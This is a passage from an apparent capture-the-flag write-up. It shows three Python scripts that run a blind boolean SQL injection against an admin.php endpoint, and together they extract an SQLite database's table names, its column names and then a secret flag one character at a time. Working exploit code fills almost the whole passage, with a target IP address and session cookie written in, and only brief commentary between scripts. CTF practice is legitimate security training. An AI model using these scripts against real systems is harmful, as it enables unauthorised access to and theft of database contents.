    payload = f"""admin' AND HEX(SUBSTR((SELECT name FROM sqlite_master WHERE type GLOB 'table' LIMIT 1 OFFSET {offset}), {c[0]}, 1)) BETWEEN '{c[1]:02x}' AND '{c[1]:02x}' --"""
    data = {"action": "status", "username": payload}
    r = requests.post(url, data=data, cookies=cookies)
    return "User is active" in r.text

def extract_table_name(offset):
    table = ""
    for pos in range(1, 100):
        found = False
        for char in range(32, 127):
            if is_char((pos, char), offset):
                table += chr(char)
                print(f"[{offset}] {table}")
                found = True
                break
        if not found:
            break
    return table

for offset in range(5): 
    name = extract_table_name(offset)
    if name:
        print(f"Found table [{offset}]: {name}")
```

Found a table called `secrets` - now we're talking! Next script was for extracting column names from that table:

```python
import requests

url = "http://34.18.12.84:8086/admin.php?action=check"
cookies = {"PHPSESSID": "d72b2109670db5942d4eea110b92bd35"}

def is_char(pos, ascii_code, offset):
    hex_char = f"{ascii_code:02x}"
    payload = f"""admin' AND HEX(SUBSTR((SELECT name FROM pragma_table_info('secrets') LIMIT 1 OFFSET {offset}), {pos}, 1)) BETWEEN '{hex_char}' AND '{hex_char}' --"""
    r = requests.post(url, data={"action": "status", "username": payload}, cookies=cookies)
    return "User is active" in r.text

def extract_column_name(offset):
    name = ""
    for pos in range(1, 100):
        found = False
        for c in range(32, 127):
            if is_char(pos, c, offset):
                name += chr(c)
                print(f"[{offset}] {name}")
                found = True
                break
        if not found:
            break
    return name

for offset in range(5):
    col = extract_column_name(offset)
    if col:
        print(f"[+] Column {offset}: {col}")
```

Found a column called `secret` - this is getting easier! Final script to extract the actual flag:

```python
import requests
import string
URL = "http://34.18.12.84:8086/admin.php?action=check"
COOKIES = {"PHPSESSID": "d72b2109670db5942d4eea110b92bd35"}

known = "ASCWG{"
start_pos = len(known) + 1 

charset = ''.join(chr(i) for i in range(32, 127))

def is_char(pos, c):
    hex_char = format(ord(c), "X").zfill(2)
    payload = f"""admin' AND HEX(SUBSTR((SELECT secret FROM secrets LIMIT 1 OFFSET 0), {pos}, 1)) BETWEEN '{hex_char}' AND '{hex_char}' --"""
    r = requests.post(URL, data={"action": "status", "username": payload}, cookies=COOKIES)
    return "User is active" in r.text

def extract_secret():
    secret = known
    for pos in range(start_pos, 100):
        found = False
        for c in charset:
            if is_char(pos, c):
                secret += c
                print(f"[{pos}] {secret}")
                found = True
                if c == "}":
                    return secret 
                break
        if not found:
            break
    return secret

flag = extract_secret()
print(f"\n[+] Final flag: {flag}")
```


developers really need to learn about `git filter-branch` or just nuke the entire repo when they mess up this badly hahaha

